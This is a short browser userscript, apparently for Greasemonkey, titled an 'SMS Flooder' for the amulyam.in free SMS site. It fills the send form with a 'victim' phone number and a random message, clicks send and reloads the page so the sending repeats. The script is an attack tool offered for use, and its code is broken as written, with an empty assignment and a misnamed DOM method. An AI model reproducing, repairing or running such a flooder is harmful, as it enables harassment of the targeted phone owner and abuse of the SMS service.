// ==UserScript==
// @name           Amulyam SMS FLooder :P
// @namespace      Pritam
// @description    SMS Flooder
// @include        http://www.amulyam.in/dsSendSms.do
// @include        http://www.amulyam.in/sendSms.do
// ==/UserScript==

var victim=; // change the number here

if(window.opener.document.location=="http://www.amulyam.in/dsSendSms.do")
{
window.opener.document.getElementByName('mobile').value=victim;

window.opener.document.getElementByName('msg').value="hi " + Math.random();

window.opener.document.getElementByName('fMsgId').click();
}
if(window.opener.document.location=="http://www.amulyam.in/sendSms.do")
{
window.opener.document.location=("http://www.amulyam.in/dsSendSms.do");
}
